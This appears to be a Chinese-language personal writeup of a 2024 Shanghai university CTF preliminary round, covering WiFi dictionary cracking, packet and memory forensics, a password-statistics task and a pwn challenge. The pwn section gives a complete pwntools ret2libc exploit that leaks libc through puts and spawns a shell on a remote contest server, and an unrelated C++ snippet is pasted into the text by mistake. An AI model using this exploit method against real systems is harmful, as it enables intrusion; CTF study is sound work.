---
title: 第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup
subtitle:
date: 2024-06-11T13:21:56+08:00
draft: false
author:
  name: 瞻鹤
  link:
  email: he-zhan@outlook.com
  avatar: /images/avatar.jpg
description:
keywords:
license:
comment: false
weight: 0
tags:
  - CTF
categories:
  - 信息安全
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter
---

<!--more-->
# 第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Writeup
# 网络安全

## MISC

### wifi密码

根据题目提示，使用crunch指令生成字典。

![1](/images/B1.png)

使用aircrack-ng工具结合自定义字典进行密码爆破得到flag{power456}

![2](/images/B2.png)

![3](/images/B3.png)

### 5GC网元AMF名称

根据题目提示猜测有一个包里面的字段为AMFName，直接搜索，得到密文。

![4](/images/B4.png)

![5](/images/B5.png)


解密得到flag:flag{amfname-ujrr1123}

### Tunnel

按协议类型排序，将所有ICMP协议包中的请求包的数据长度转为ASCII字符即得到flag。

![6](/images/B6.png)

flag{iCmp\_1s\_tO0\_Ea5y}

### ezdmp

取证工具发现有一个result.txt文件，将其读取出来。

![7](/images/B7.png)

![8](/images/B8.png)

![9](/images/B9.png)

发现Password对应的值形似flag，盲猜就是提交发现确实是flag

flag{ROck\_4nd\_Sh4N9H41}

## PWN

### 推箱子

运行程序，发现是简单的推箱子游戏，和题目描述一致。使用ida打开文件，能够发现明显的栈溢出漏洞。

![10](/images/B10.png)

read函数存在栈溢出漏洞。分析程序可知，v6的值随着角色每次移动都会增大，所以只需要先让角色移动一定长度后再通过游戏即可让v6的大小大于栈长度，实现栈溢出。

```python
payload = 0x570 * b'da' + b'ddwwwwssdwwssassdwwwsssdww'
```

xxxxxxxxxx void print(ll n){    ll d = n / 4;    if(n % 4 == 0){        cout << d << ' ' << d << ' ' << d * 2 << '\n';    }else if(n % 4 == 1){        cout << 1 << ' ' << (n - 1) / 2 << ' ' << (n - 1) / 2 << '\n';    }else if(n % 4 == 2){        cout << 2 << ' ' << (n - 2) / 2 << ' ' << (n - 2) / 2 << '\n';    }else{        cout << 1 << ' ' << (n - 1) / 2 << ' ' << (n - 1) / 2 << '\n';    }}void solve(){    ll n, k;    cin >> n >> k;    if(k == 3){        print(n);    }else{        for(int i = 1; i <= k - 3; i++)            cout << 1 << ' ';        n -= k - 3;        print(n);    }}c++

```python
from pwn import *
context(os='linux',arch='amd64',log_level = 'debug')
def get_addr():
    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
p = remote("222.67.132.186",23267)
elf = ELF('./game')
_libc = ELF('./libc.so.6')
pop_rdi_addr = 0x400cf3
ret_addr = 0x400576
main_addr = 0x4006D7
_p_libc_system = _libc.symbols['system']
_p_libc_binsh = _libc.search(b'/bin/sh').__next__()
_p_libc_puts = _libc.symbols['puts']
puts_plt = elf.plt['puts'] #puts函数的入口地址
puts_got = elf.got['puts']  #puts函数的got表地址
payload = 0x570 * b'da' + b'ddwwwwssdwwssassdwwwsssdww'
p.sendline(payload)
payload2 = 0x570 * b'A' + 0x8 * b'A' + p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter( b'Grandmaster, Please leave your name:',payload2)
real_puts_addr = get_addr()
print(hex(real_puts_addr))
libc_base = real_puts_addr - _p_libc_puts
p_system = libc_base  + _p_libc_system
p_binsh = libc_base  + _p_libc_binsh
p.sendline(payload)
payload3 = 0x570 * b'A' + 0x8 * b'A' + p64(ret_addr) + p64(pop_rdi_addr) + p64(p_binsh) + p64(p_system)
p.sendlineafter( b'Grandmaster, Please leave your name:',payload3)
p.interactive()
```

# 数据安全

### 口令画像分析一 & 二

按照题目约束条件，编写程序分析即可。

![11](/images/B11.png)

得到题目一答案为5014,4954,5052,4980

得到题目二答案为129，

用MD532位小写加密即为答案。

flag{711314c61e9b9172a6688573498c8321}

flag{d1f491a404d6854880943e5c3cd9ca25}

```go
package main

import (
	"fmt"
	"github.com/360EntSecGroup-Skylar/excelize"
)

func main() {
	// 打开 Excel 文件
	f, err := excelize.OpenFile("./user.xlsx")
	if err != nil {
		fmt.Println(err)
		return
	}
	// 读取 Sheet1 中 A1 单元格的值
	// from C2 to C20001
	cnt1 := 0
	cnt2 := 0
	cnt3 := 0
	cnt4 := 0
	cnt5 := 0
	for i := 2; i <= 20001; i++ {
		s := fmt.Sprintf("C%d", i)
		s1 := fmt.Sprintf("D%d", i)
		cellValue := f.GetCellValue("Sheet1", s)
		id := f.GetCellValue("Sheet1", s1)
		//fmt.Println(cellValue)
		if err != nil {
			fmt.Println(err)
			return
		}
		// 输出单元格值
		flag := 0
		for j := 0; j < len(cellValue); j++ {
			if cellValue[j] >= '0' && cellValue[j] <= '9' {
				flag |= 1
			} else if cellValue[j] >= 'a' && cellValue[j] <= 'z' {
				flag |= 2
			} else if cellValue[j] >= 'A' && cellValue[j] <= 'Z' {
				flag |= 4
			} else {
				flag |= 8
			}
		}
		if flag == 1 || flag == 2 {
			cnt1++
		} else if flag == 3 {
			cnt2++
		} else if flag == 7 {
			//fmt.Println(cellValue)
			cnt3++
		} else if flag == 15 {
			//fmt.Println(cellValue)
			cnt4++
			year := 0
			sex := 0
			if id[16] == 'X' {
				sex = 1
			} else {
				if (id[16]-'0')%2 == 0 {
					sex = 1
				}
			}
			for j := 6; j <= 9; j++ {
				year = year*10 + (int)(id[j]-'0')
			}
			//month := 0
			day := (id[12]-'0')*10 + (id[13] - '0')
			month := (id[10]-'0')*10 + (id[11] - '0')
			if day > 31 {
				fmt.Println(day)
			}
			if year == 2002 && sex == 1 {
				if month == 5 && day >= 21 {
					cnt5++
				}
				if month == 6 && day <= 21 {
					cnt5++
				}
			}
		}
	}
	fmt.Println(cnt1)
	fmt.Println(cnt2)
	fmt.Println(cnt3)
	fmt.Println(cnt4)
	fmt.Println(cnt1 + cnt2 + cnt3 + cnt4)
	fmt.Println(cnt5)
}
```





